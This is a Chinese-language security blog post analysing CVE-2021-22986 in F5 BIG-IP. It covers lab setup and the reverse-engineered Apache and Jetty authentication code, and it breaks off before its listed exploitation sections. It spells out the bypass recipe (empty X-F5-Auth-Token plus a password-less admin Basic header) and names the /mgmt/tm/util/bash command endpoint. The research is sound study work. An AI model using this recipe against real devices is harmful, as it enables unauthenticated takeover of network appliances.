<!doctype html><html lang=zh-cn>
<head>
<meta charset=utf-8>
<meta name=viewport content="width=device-width,initial-scale=1">
<meta name=robots content="noodp">
<meta http-equiv=x-ua-compatible content="IE=edge, chrome=1">
<title>CVE-2021-22986 - 栖迟於一丘</title><meta name=Description content><meta property="og:title" content="CVE-2021-22986">
<meta property="og:description" content="0x0 前言 什么是F5 BIG-IP? F5 Big-IP是F5公司一款集成流量管理、DNS、出入站规则、web应用防火墙、web网关、负载均衡等功能的应用交付平台 漏">
<meta property="og:type" content="article">
<meta property="og:url" content="http://int80.top/cve-2021-22986/"><meta property="article:section" content="posts">
<meta property="article:published_time" content="2022-06-10T00:00:00+00:00">
<meta property="article:modified_time" content="2022-06-10T00:00:00+00:00">
<meta name=twitter:card content="summary">
<meta name=twitter:title content="CVE-2021-22986">
<meta name=twitter:description content="0x0 前言 什么是F5 BIG-IP? F5 Big-IP是F5公司一款集成流量管理、DNS、出入站规则、web应用防火墙、web网关、负载均衡等功能的应用交付平台 漏">
<meta name=application-name content="花满楼">
<meta name=apple-mobile-web-app-title content="花满楼"><meta name=theme-color content="#ffffff"><meta name=msapplication-TileColor content="#da532c"><link rel=icon href=/mstile-150x150.png><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><link rel=manifest href=/site.webmanifest><link rel=canonical href=http://int80.top/cve-2021-22986/><link rel=prev href=http://int80.top/hooktechnique/><link rel=next href=http://int80.top/22-12-12/><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/normalize.css@8.0.1/normalize.min.css><link rel=stylesheet href=/css/style.min.css><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.13.0/css/all.min.css><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/animate.css@3.7.2/animate.min.css><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"CVE-2021-22986","inLanguage":"zh-CN","mainEntityOfPage":{"@type":"WebPage","@id":"http:\/\/int80.top\/cve-2021-22986\/"},"genre":"posts","keywords":"CVE","wordcount":8241,"url":"http:\/\/int80.top\/cve-2021-22986\/","datePublished":"2022-06-10T00:00:00+00:00","dateModified":"2022-06-10T00:00:00+00:00","publisher":{"@type":"Organization","name":"ShiDong"},"author":{"@type":"Person","name":"ShiDong"},"description":""}</script></head>
<body header-desktop=fixed header-mobile=auto><script type=text/javascript>(window.localStorage&&localStorage.getItem('theme')?localStorage.getItem('theme')==='dark':''==='auto'?window.matchMedia('(prefers-color-scheme: dark)').matches:''==='dark')&&document.body.setAttribute('theme','dark')</script>
<div id=mask></div><div class=wrapper><header class=desktop id=header-desktop>
<div class=header-wrapper>
<div class=header-title>
<a href=/ title=栖迟於一丘><img class="lazyload logo" src=/svg/loading.min.svg data-src=/1.png data-srcset="/1.png, /1.png 1.5x, /1.png 2x" data-sizes=auto alt=/1.png title=/1.png>INT80</a>
</div>
<div class=menu>
<div class=menu-inner><a class=menu-item href=/posts/> Posts </a><a class=menu-item href=/tags/> Tags </a><a class=menu-item href=/categories/> Categories </a><a class=menu-item href=/aboutme/> About Me </a><a class=menu-item href=/search/><i class="fas fa-fw fa-search"></i> search </a><span class="menu-item delimiter"></span><a href=javascript:void(0); class="menu-item theme-switch" title=切换主题>
<i class="fas fa-adjust fa-fw"></i>
</a>
</div>
</div>
</div>
</header><header class=mobile id=header-mobile>
<div class=header-container>
<div class=header-wrapper>
<div class=header-title>
<a href=/ title=栖迟於一丘><img class="lazyload logo" src=/svg/loading.min.svg data-src=/1.png data-srcset="/1.png, /1.png 1.5x, /1.png 2x" data-sizes=auto alt=/1.png title=/1.png>INT80</a>
</div>
<div class=menu-toggle id=menu-toggle-mobile>
<span></span><span></span><span></span>
</div>
</div>
<div class=menu id=menu-mobile><a class=menu-item href=/posts/ title>Posts</a><a class=menu-item href=/tags/ title>Tags</a><a class=menu-item href=/categories/ title>Categories</a><a class=menu-item href=/aboutme/ title>About Me</a><a class=menu-item href=/search/ title><i class="fas fa-fw fa-search"></i>search</a><a href=javascript:void(0); class="menu-item theme-switch" title=切换主题>
<i class="fas fa-adjust fa-fw"></i>
</a></div>
</div>
</header>
<div class="search-dropdown desktop">
<div id=search-dropdown-desktop></div>
</div>
<div class="search-dropdown mobile">
<div id=search-dropdown-mobile></div>
</div>
<main class=main>
<div class=container>
<div class=toc id=toc-auto>
<h2 class=toc-title>目录</h2>
<div class=toc-content id=toc-content-auto></div>
</div><article class="page single"><h1 class="single-title animated flipInX">CVE-2021-22986</h1><div class=post-meta>
<div class=post-meta-line><span class=post-author><a href=/ title=Author rel=author class=author><i class="fas fa-user-circle fa-fw"></i>ShiDong</a></span>&nbsp;<span class=post-category>收录于 <a href=/categories/cve/><i class="far fa-folder fa-fw"></i>CVE</a></span></div>
<div class=post-meta-line><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime=2022-06-10>2022-06-10</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 8241 字
<i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 17 分钟&nbsp;</div>
</div><div class="details toc" id=toc-static kept>
<div class="details-summary toc-title">
<span>目录</span>
<span><i class="details-icon fas fa-angle-right"></i></span>
</div>
<div class="details-content toc-content" id=toc-content-static><nav id=TableOfContents>
<ul>
<li>
<ul>
<li>
<ul>
<li><a href=#0x0-前言>0x0 前言</a></li>
<li><a href=#0x1-漏洞靶机环境搭建>0x1 漏洞靶机环境搭建</a></li>
<li><a href=#0x2-漏洞原理分析>0x2 漏洞原理分析</a>
<ul>
<li><a href=#0x20-rce>0x20 RCE</a></li>
<li><a href=#0x21-ssrf>0x21 SSRF</a></li>
</ul>
</li>
<li><a href=#0x3-漏洞利用>0x3 漏洞利用</a>
<ul>
<li><a href=#0x30-rce>0x30 RCE</a></li>
<li><a href=#0x31-ssrf>0x31 SSRF</a></li>
</ul>
</li>
<li><a href=#0x4-总结>0x4 总结</a></li>
</ul>
</li>
</ul>
</li>
</ul>
</nav></div>
</div><div class=content id=content><h4 id=0x0-前言>0x0 前言</h4>
<ol>
<li>
<p>什么是F5 BIG-IP?
F5 Big-IP是F5公司一款集成流量管理、DNS、出入站规则、web应用防火墙、web网关、负载均衡等功能的应用交付平台</p>
</li>
<li>
<p>漏洞所在
iControl REST 接口存在未认证远程命令执行漏洞</p>
</li>
<li>
<p>漏洞影响
该漏洞允许未认证的攻击者通过网络访问iControl REST接口，然后通过BIG-IP的管理界面和自身IP地址来执行任意系统命令，例如创建或删除文件以及禁用服务。这个漏洞仅能通过控制面板(control plane)利用，不能通过数据面板利用。该漏洞利用会导致整个系统陷入危险。BIG-IP系统的设备模式(Appliance mode)同样是可受攻击的。</p>
</li>
<li>
<p>reference</p>
<p><a href="https://cert.360.cn/report/detail?id=21f072510201a4d2999ad1756def39f6" target=_blank rel="noopener noreffer">360分析</a></p>
<p><a href=https://cloud.tencent.com/developer/article/1850804 target=_blank rel="noopener noreffer">Al1ex</a></p>
<p><a href=https://y4y.space/2021/03/19/cve-2021-22986-f5-rest-unauthenticated-rce-analysis/ target=_blank rel="noopener noreffer">brandonshi123</a></p>
<p><a href=https://attackerkb.com/topics/J6pWeg5saG/k03009991-icontrol-rest-unauthenticated-remote-command-execution-vulnerability-cve-2021-22986 target=_blank rel="noopener noreffer">attackerkb</a></p>
</li>
</ol>
<p>之前接触的都是二进制软件安全，并没有接触过web安全，但因为之后会进入网络安全行业，所以需要拥有一些基础，对该技术方向拥有一个概念。因此以该CVE为学习契机进行网络安全的学习。
该博客是站在其他研究员做的结论的肩膀上编写的，很多内容和reference有重复，更重要的是，很多困难却又关键的地方，都是从他们那里直接获取结论，而不需要自己再去一步步分析才能得到结果，但是自己都尽量汲取知识，自己动手尝试了。同时在学习以及复现的过程中，反思得到以下结论，这些结论我觉得会对之后的研究深耕会有一定程度的帮助。</p>
<ul>
<li>如何定位vulnerability?这是最难也是最关键的的一步，结合我学习的知识，对于一个大型软件来说，不可能人工代码审计去找攻击点，费时费力效率低，只能通过自动化的方法去获取vulnerability，例如fuzz技术，或者污点追踪，符号执行，甚至三种技术结合，这样才能有效定位vulnerability。从brandonshi123的reference博客中，他们是团队合作，首先fuzz了整个应用的目录查找到以非正确的认证报文获得了200 OK的response后才获取关键字，然后根据关键字才定位了bypass authorization发生的代码处。那么从关键字到定位关键代码处，这一个过程又需要人工分析大量代码才能完成定位，而这一过程又涉及到逆向工程，代码审计。综上，定位vulnerability是我在此次训练中没能完成的，以我的能力以及掌握的知识广度来说，我们办法完成定位，同时这也反映了，在之后的学习以及工作中，一定要提升定位vulnerability的能力，这同时也是一个安全研究员的能力强弱重要判定因素。</li>
<li>对于网络安全来说，知识面的广度与知识掌握的深度同样重要。广度让你能对更多信息更加敏感从而抓住更加细节的东西，而这些往往是关键所在，例如，apache服务的认证是通过mod_auth_pam.so库，如果知道这一点，那么就可以迅速定位。如果放大到更广的方向，网络安全范围很大，也许今天的软件是java写的，而我刚好掌握java知识，那么我可以更轻松的完成任务，但如果明天要分析的软件是rust写的，那么如果对rust特性以及rust应用特性的了解，同样可以意识到这些特性哪里容易出问题。对于逆向工程，很多软件使用不同框架，不同语言编写，这就要求研究员们对各种框架都有一个概念，或者说能通过经验判别出这是利用了某个框架的api，从而去学习这个框架然后才能进行下一步的逆向分析。但如果知识面广度不够，即使线索摆在了面前，也很难反应过来原来这就是漏洞的原因并抓住。</li>
</ul>
<h4 id=0x1-漏洞靶机环境搭建>0x1 漏洞靶机环境搭建</h4>
<p>官网注册账号，地区不要选择中国，并且如果ip地址在中国的话会被告知Export Compliance check - failure，导致无法下载，这个时候就需要魔法上网了
下载16.0.1版本的virtual Edition，如下图</p>
<p><img class=lazyload src=/svg/loading.min.svg data-src=download.png data-srcset="/cve-2021-22986/download.png, download.png 1.5x, /cve-2021-22986/download.png 2x" data-sizes=auto alt=/cve-2021-22986/download.png title=download></p>
<p>下载完成后使用VMWARE打开，将BIG-IP系统导入。
导入成功，启动虚拟机则有如下界面</p>
<p><img class=lazyload src=/svg/loading.min.svg data-src=start.png data-srcset="/cve-2021-22986/start.png, start.png 1.5x, /cve-2021-22986/start.png 2x" data-sizes=auto alt=/cve-2021-22986/start.png title=start></p>
<p>当第一次启动BIG-IP系统后会要求填写localhost login and password
BIG-IP初始账号密码为root/default
登陆成功后会要求立即更改root的密码</p>
<p><img class=lazyload src=/svg/loading.min.svg data-src=login.png data-srcset="/cve-2021-22986/login.png, login.png 1.5x, /cve-2021-22986/login.png 2x" data-sizes=auto alt=/cve-2021-22986/login.png title=login></p>
<p>在命令行输入config，获取BIG-IP的IP信息</p>
<p><img class=lazyload src=/svg/loading.min.svg data-src=dangeraddr.png data-srcset="/cve-2021-22986/dangeraddr.png, dangeraddr.png 1.5x, /cve-2021-22986/dangeraddr.png 2x" data-sizes=auto alt=/cve-2021-22986/dangeraddr.png title=dangeraddr></p>
<p>来到浏览器，输入URL:<a href=https://192.168.124.16 target=_blank rel="noopener noreffer">https://192.168.124.16</a> 得到如下界面</p>
<p><img class=lazyload src=/svg/loading.min.svg data-src=weblogin.png data-srcset="/cve-2021-22986/weblogin.png, weblogin.png 1.5x, /cve-2021-22986/weblogin.png 2x" data-sizes=auto alt=/cve-2021-22986/weblogin.png title=web_login></p>
<p>这里username 填入admin，password 填入我们更改的新密码
成功登录后会要求我们修改新密码。
再次登录即可进入系统界面。
首先进入页面会需要key进行注册，这里可以通过<a href=https://www.f5.com.cn/trials/big-ip-virtual-edition target=_blank rel="noopener noreffer">申请30天试用key</a>网站获取</p>
<p><img class=lazyload src=/svg/loading.min.svg data-src=key-auth.png data-srcset="/cve-2021-22986/key-auth.png, key-auth.png 1.5x, /cve-2021-22986/key-auth.png 2x" data-sizes=auto alt=/cve-2021-22986/key-auth.png title=key-auth></p>
<p>若key验证成功则会获得Dossier，然后将该Dossier激活即可。</p>
<p><img class=lazyload src=/svg/loading.min.svg data-src=Dossier.png data-srcset="/cve-2021-22986/Dossier.png, Dossier.png 1.5x, /cve-2021-22986/Dossier.png 2x" data-sizes=auto alt=/cve-2021-22986/Dossier.png title=Dossier></p>
<p><img class=lazyload src=/svg/loading.min.svg data-src=activate.png data-srcset="/cve-2021-22986/activate.png, activate.png 1.5x, /cve-2021-22986/activate.png 2x" data-sizes=auto alt=/cve-2021-22986/activate.png title=activate></p>
<p>激活成功则会出现协议，同意即可。
接着会给出license key，我们要复制到Dossier界面下面的文本框中</p>
<p><img class=lazyload src=/svg/loading.min.svg data-src=licensekey.png data-srcset="/cve-2021-22986/licensekey.png, licensekey.png 1.5x, /cve-2021-22986/licensekey.png 2x" data-sizes=auto alt=/cve-2021-22986/licensekey.png title=liciensekey></p>
<p><img class=lazyload src=/svg/loading.min.svg data-src=licensekeyact.png data-srcset="/cve-2021-22986/licensekeyact.png, licensekeyact.png 1.5x, /cve-2021-22986/licensekeyact.png 2x" data-sizes=auto alt=/cve-2021-22986/licensekeyact.png title=liciensekeyact></p>
<p>若能成功激活，则有如下界面</p>
<p><img class=lazyload src=/svg/loading.min.svg data-src=actsucceed.png data-srcset="/cve-2021-22986/actsucceed.png, actsucceed.png 1.5x, /cve-2021-22986/actsucceed.png 2x" data-sizes=auto alt=/cve-2021-22986/actsucceed.png title=actsucceed></p>
<p>如此就建立好了漏洞靶机。</p>
<h4 id=0x2-漏洞原理分析>0x2 漏洞原理分析</h4>
<h5 id=0x20-rce>0x20 RCE</h5>
<p>HTTP请求如何到达后端服务器：当客户端发送一个HTTP请求后，首先会经过Apache,然后Apache做一些认证和头部检验，接着会将请求传递给使用JAVA编写的Jetty服务，在Jetty中做一些其他的身份认证事情，然后回应客户端。</p>
<p>在Big-IP中，<strong>https:<host>/mgmt</strong> URL就是用来管理的，因此他将会要求身份认证。在brandonshi123的reference中，作者团队通过fuzz发现https://<host>/mgmt/toc要求帐号和密码，但是却返回了200 OK，这个状态码表示请求成功。因此他们在服务器端以/mgmt/toc为关键词进行搜索，找到Apache的一个公共库mod_auth_pam.so,并判断authentication bypass就存在该so文件里</p>
<p>通过空的<strong>HTTP X-F5-Auth-Token</strong>和仅拥有username： <strong>Authorization:Basic$(base64_encode(&ldquo;admin:"))</strong> 基本身份认证头就可以绕过身份验证.基本的身份验证只检查username，而不是password</p>
<p>API在 <strong>https://<host>/mgmt/tm/util/bash</strong> 执行系统命令,因此unauthenticated RCE 就是在此实现的。</p>
<p>在该应用中会发生两次认证，分别是apache和jetty服务的验证，因此有两种头部可以绕过验证。</p>
<p>在这里先给出结论，分析代码后，我们通过Burpsuit进行发包验证。</p>
<p>首先，我们需要从漏洞靶机获取两个验证所在的代码。第一个是Apache的认证代码，其存在mod_auth_pam.so中，其是Apache的共享库，我们从漏洞靶机的/usr/lib/httpd/modules文件夹中可以获取。第二个是Jetty的认证代码所在，其存在于漏洞靶机的/usr/share/java/rest/中，文件名为f5.rest.jar。</p>
<p>使用IDA打开mod_auth_pam.so文件，我们需要查找代码中使用了X-F5-Token字符串的代码，从而确定其在代码流程图的位置，首先在string window搜索Token，我们就可以直接查找到该字符串了，如下图</p>
<p><img class=lazyload src=/svg/loading.min.svg data-src=searchtoken.png data-srcset="/cve-2021-22986/searchtoken.png, searchtoken.png 1.5x, /cve-2021-22986/searchtoken.png 2x" data-sizes=auto alt=/cve-2021-22986/searchtoken.png title=searchToken></p>
<p>接着双击该字符串，就能跳转至该字符串存在的段中，接着右键aXF5AuthToken，选择List cross reference to&mldr;选项找到调用该字符串的代码，得到如下图，双击跳转即可得到该字符串调用代码所在流程图的位置了</p>
<p><img class=lazyload src=/svg/loading.min.svg data-src=searchxrefs.png data-srcset="/cve-2021-22986/searchxrefs.png, searchxrefs.png 1.5x, /cve-2021-22986/searchxrefs.png 2x" data-sizes=auto alt=/cve-2021-22986/searchxrefs.png title=searchxrefs></p>
<p><img class=lazyload src=/svg/loading.min.svg data-src=tokenplace.png data-srcset="/cve-2021-22986/tokenplace.png, tokenplace.png 1.5x, /cve-2021-22986/tokenplace.png 2x" data-sizes=auto alt=/cve-2021-22986/tokenplace.png title=tokenplace></p>
<p>接着来分析它的代码，这里调用了一个_apr_table_get的函数，这是Apache提供的c语言编程库，我们可以在网上搜索到该函数的作用</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-C data-lang=C>  <span class=cm>/**
</span><span class=cm>  * Get the value associated with a given key from the table. After this call,
</span><span class=cm>  * The data is still in the table
</span><span class=cm>  * @param t The table to search for the key
</span><span class=cm>  * @param key The key to search for
</span><span class=cm>  * @return The value associated with the key, or NULL if the key does not exist.
</span><span class=cm>  */</span>
  <span class=n>APR_DECLARE</span><span class=p>(</span><span class=k>const</span> <span class=kt>char</span> <span class=o>*</span><span class=p>)</span> <span class=n>apr_table_get</span><span class=p>(</span><span class=k>const</span> <span class=n>apr_table_t</span> <span class=o>*</span><span class=n>t</span><span class=p>,</span> <span class=k>const</span> <span class=kt>char</span> <span class=o>*</span><span class=n>key</span><span class=p>);</span>
</code></pre></td></tr></table>
</div>
</div><p>由上述对apr_table_get函数的描述可知，如果该key存在该函数会从table中返回key的value，如果该key值不在table中存在就会返回空值。</p>
<p>因此上述调用了X-F5-Auth-Token的代码就是在做一件事，由最后两行的<strong>test eax,eax</strong>(若返回NULL，即没有X-F5-Auth-Token字段，该指令会将ZF置1) 和 <strong>jz loc_8766</strong> 可以知，该事情就是判断X-F5-Auth-Token是否存在于table中。也就是说报文是否拥有X-F5-Auth-Token字段。</p>
<p>接着看如果存在会执行什么代码，不存在又会执行什么代码</p>
<p>如果将IDA沿着红线追踪(即存在X-F5-Auth-Token字段的话)，会发现Apache的处理已经到了收尾阶段，如果程序运行无差错则会将报文发送给jetty服务。如下图:</p>
<p><img class=lazyload src=/svg/loading.min.svg data-src=ApacheLast.png data-srcset="/cve-2021-22986/ApacheLast.png, ApacheLast.png 1.5x, /cve-2021-22986/ApacheLast.png 2x" data-sizes=auto alt=/cve-2021-22986/ApacheLast.png title=Apachelast></p>
<p>如果IDA沿着绿线追踪(即没有X-F5-Auth-Token字段的话)，会看到Apache将会进行Basic Auth检验。首先会判断报文是否存在Authorization字段，然后进行Basic auth的检验，会对账号密码进行检验。</p>
<p><img class=lazyload src=/svg/loading.min.svg data-src=Authorization.png data-srcset="/cve-2021-22986/Authorization.png, Authorization.png 1.5x, /cve-2021-22986/Authorization.png 2x" data-sizes=auto alt=/cve-2021-22986/Authorization.png title=Authorization></p>
<p><img class=lazyload src=/svg/loading.min.svg data-src=basicauth.png data-srcset="/cve-2021-22986/basicauth.png, basicauth.png 1.5x, /cve-2021-22986/basicauth.png 2x" data-sizes=auto alt=/cve-2021-22986/basicauth.png title=basicauth></p>
<p>综上，Apache服务只检查X-F5-Auth-Token存不存在，而不检查正不正确，如果不存在就会去进行basic auth检验,否则就跳过basic auth的检验，直接将request传递给jetty服务，因此我们伪造空X-F5-Auth-token就可避免Apache对basic auth的检验。</p>
<p>jetty server中 <strong>f5.rest.workers.authz.AuthzHelper.class</strong></p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-java data-lang=java>  <span class=kd>public</span> <span class=kd>static</span> <span class=n>BasicAuthComponents</span> <span class=nf>decodeBasicAuth</span><span class=o>(</span><span class=n>String</span> <span class=n>encodedValue</span><span class=o>)</span> <span class=o>{</span>
    <span class=n>BasicAuthComponents</span> <span class=n>components</span> <span class=o>=</span> <span class=k>new</span> <span class=n>BasicAuthComponents</span><span class=o>();</span>
    <span class=k>if</span> <span class=o>(</span><span class=n>encodedValue</span> <span class=o>==</span> <span class=kc>null</span><span class=o>)</span> <span class=o>{</span>
      <span class=k>return</span> <span class=n>components</span><span class=o>;</span>
    <span class=o>}</span>

    <span class=n>String</span> <span class=n>decodedBasicAuth</span> <span class=o>=</span> <span class=k>new</span> <span class=n>String</span><span class=o>(</span><span class=n>DatatypeConverter</span><span class=o>.</span><span class=na>parseBase64Binary</span><span class=o>(</span><span class=n>encodedValue</span><span class=o>));</span>
    <span class=kt>int</span> <span class=n>idx</span> <span class=o>=</span> <span class=n>decodedBasicAuth</span><span class=o>.</span><span class=na>indexOf</span><span class=o>(</span><span class=sc>&#39;:&#39;</span><span class=o>);</span>
    <span class=k>if</span> <span class=o>(</span><span class=n>idx</span> <span class=o>&gt;</span> <span class=n>0</span><span class=o>)</span> <span class=o>{</span>
      <span class=n>components</span><span class=o>.</span><span class=na>userName</span> <span class=o>=</span> <span class=n>decodedBasicAuth</span><span class=o>.</span><span class=na>substring</span><span class=o>(</span><span class=n>0</span><span class=o>,</span> <span class=n>idx</span><span class=o>);</span>
      <span class=k>if</span> <span class=o>(</span><span class=n>idx</span> <span class=o>+</span> <span class=n>1</span> <span class=o>&lt;</span> <span class=n>decodedBasicAuth</span><span class=o>.</span><span class=na>length</span><span class=o>())</span>
      <span class=o>{</span>

        <span class=n>components</span><span class=o>.</span><span class=na>password</span> <span class=o>=</span> <span class=n>decodedBasicAuth</span><span class=o>.</span><span class=na>substring</span><span class=o>(</span><span class=n>idx</span> <span class=o>+</span> <span class=n>1</span><span class=o>);</span>
      <span class=o>}</span>
    <span class=o>}</span>

    <span class=k>return</span> <span class=n>components</span><span class=o>;</span>
  <span class=o>}</span>
</code></pre></td></tr></table>
</div>
</div><p>将basic auth头进行解码，以&rdquo;:&ldquo;作为分隔符，分割出username和password，然后存入component中</p>
<p>在<strong>f5.rest.RestOperationIdentifier.class</strong>中</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-java data-lang=java>    <span class=kd>private</span> <span class=kd>static</span> <span class=kt>boolean</span> <span class=nf>setIdentityFromBasicAuth</span><span class=o>(</span><span class=n>RestOperation</span> <span class=n>request</span><span class=o>)</span> <span class=o>{</span>
        <span class=n>String</span> <span class=n>authHeader</span> <span class=o>=</span> <span class=n>request</span><span class=o>.</span><span class=na>getBasicAuthorization</span><span class=o>();</span>
        <span class=k>if</span> <span class=o>(</span><span class=n>authHeader</span> <span class=o>==</span> <span class=kc>null</span><span class=o>)</span> <span class=o>{</span>
          <span class=k>return</span> <span class=kc>false</span><span class=o>;</span>
        <span class=o>}</span>
        <span class=n>AuthzHelper</span><span class=o>.</span><span class=na>BasicAuthComponents</span> <span class=n>components</span> <span class=o>=</span> <span class=n>AuthzHelper</span><span class=o>.</span><span class=na>decodeBasicAuth</span><span class=o>(</span><span class=n>authHeader</span><span class=o>);</span>
        <span class=n>request</span><span class=o>.</span><span class=na>setIdentityData</span><span class=o>(</span><span class=n>components</span><span class=o>.</span><span class=na>userName</span><span class=o>,</span> <span class=kc>null</span><span class=o>,</span> <span class=kc>null</span><span class=o>);</span>
        <span class=k>return</span> <span class=kc>true</span><span class=o>;</span>
      <span class=o>}</span>

</code></pre></td></tr></table>
</div>
</div><div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-java data-lang=java>    <span class=kd>public</span> <span class=n>RestOperation</span> <span class=nf>setIdentityData</span><span class=o>(</span><span class=n>String</span> <span class=n>userName</span><span class=o>,</span> <span class=n>RestReference</span> <span class=n>userReference</span><span class=o>,</span> <span class=n>RestReference</span><span class=o>[]</span> <span class=n>groupReferences</span><span class=o>)</span> <span class=o>{</span>
      <span class=k>if</span> <span class=o>(</span><span class=n>userName</span> <span class=o>==</span> <span class=kc>null</span> <span class=o>&amp;&amp;</span> <span class=o>!</span><span class=n>RestReference</span><span class=o>.</span><span class=na>isNullOrEmpty</span><span class=o>(</span><span class=n>userReference</span><span class=o>))</span> <span class=o>{</span>
        <span class=n>String</span> <span class=n>segment</span> <span class=o>=</span> <span class=n>UrlHelper</span><span class=o>.</span><span class=na>getLastPathSegment</span><span class=o>(</span><span class=n>userReference</span><span class=o>.</span><span class=na>link</span><span class=o>);</span>
        <span class=k>if</span> <span class=o>(</span><span class=n>userReference</span><span class=o>.</span><span class=na>link</span><span class=o>.</span><span class=na>equals</span><span class=o>(</span><span class=n>UrlHelper</span><span class=o>.</span><span class=na>buildPublicUri</span><span class=o>(</span><span class=n>UrlHelper</span><span class=o>.</span><span class=na>buildUriPath</span><span class=o>(</span><span class=k>new</span> <span class=n>String</span><span class=o>[]</span> <span class=o>{</span> <span class=n>WellKnownPorts</span><span class=o>.</span><span class=na>AUTHZ_USERS_WORKER_URI_PATH</span><span class=o>,</span> <span class=n>segment</span> <span class=o>}))))</span>
        <span class=o>{</span>
          <span class=n>userName</span> <span class=o>=</span> <span class=n>segment</span><span class=o>;</span>
        <span class=o>}</span>
      <span class=o>}</span>
      <span class=k>if</span> <span class=o>(</span><span class=n>userName</span> <span class=o>!=</span> <span class=kc>null</span> <span class=o>&amp;&amp;</span> <span class=n>RestReference</span><span class=o>.</span><span class=na>isNullOrEmpty</span><span class=o>(</span><span class=n>userReference</span><span class=o>))</span> <span class=o>{</span>
        <span class=n>userReference</span> <span class=o>=</span> <span class=k>new</span> <span class=n>RestReference</span><span class=o>(</span><span class=n>UrlHelper</span><span class=o>.</span><span class=na>buildPublicUri</span><span class=o>(</span><span class=n>UrlHelper</span><span class=o>.</span><span class=na>buildUriPath</span><span class=o>(</span><span class=k>new</span> <span class=n>String</span><span class=o>[]</span> <span class=o>{</span> <span class=n>WellKnownPorts</span><span class=o>.</span><span class=na>AUTHZ_USERS_WORKER_URI_PATH</span><span class=o>,</span> <span class=n>userName</span> <span class=o>})));</span>
      <span class=o>}</span>


      <span class=k>this</span><span class=o>.</span><span class=na>identityData</span> <span class=o>=</span> <span class=k>new</span> <span class=n>IdentityData</span><span class=o>();</span>
      <span class=k>this</span><span class=o>.</span><span class=na>identityData</span><span class=o>.</span><span class=na>userName</span> <span class=o>=</span> <span class=n>userName</span><span class=o>;</span>
      <span class=k>this</span><span class=o>.</span><span class=na>identityData</span><span class=o>.</span><span class=na>userReference</span> <span class=o>=</span> <span class=n>userReference</span><span class=o>;</span>
      <span class=k>this</span><span class=o>.</span><span class=na>identityData</span><span class=o>.</span><span class=na>groupReferences</span> <span class=o>=</span> <span class=n>groupReferences</span><span class=o>;</span>
      <span class=k>return</span> <span class=k>this</span><span class=o>;</span>
    <span class=o>}</span>
</code></pre></td></tr></table>
</div>
</div><p>如果userReference为空，就对userReference进行构造,即buildUriPath函数
上述代码的buildUriPath就是用来拼接字符串的函数，只需知道这个功能即可</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=n>userReference</span> <span class=o>=</span> <span class=k>new</span> <span class=n>RestReference</span><span class=o>(</span><span class=n>UrlHelper</span><span class=o>.</span><span class=na>buildPublicUri</span><span class=o>(</span><span class=n>UrlHelper</span><span class=o>.</span><span class=na>buildUriPath</span><span class=o>(</span><span class=k>new</span> <span class=n>String</span><span class=o>[]</span> <span class=o>{</span> <span class=n>WellKnownPorts</span><span class=o>.</span><span class=na>AUTHZ_USERS_WORKER_URI_PATH</span><span class=o>,</span> <span class=n>userName</span> <span class=o>})));</span>
</code></pre></td></tr></table>
</div>
</div><p>里面的WellknownPorts.AUTHZ_USERS_WORKER_URI_PATH定义为</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=kd>public</span> <span class=kd>static</span> <span class=kd>final</span> <span class=n>String</span> <span class=n>AUTHZ_USERS_WORKER_URI_PATH</span> <span class=o>=</span> <span class=n>UrlHelper</span><span class=o>.</span><span class=na>buildUriPath</span><span class=o>(</span><span class=k>new</span> <span class=n>String</span><span class=o>[]</span> <span class=o>{</span> <span class=n>AUTHZ_WORKER_URI_PATH</span><span class=o>,</span> <span class=s>&#34;users&#34;</span> <span class=o>});</span>
</code></pre></td></tr></table>
</div>
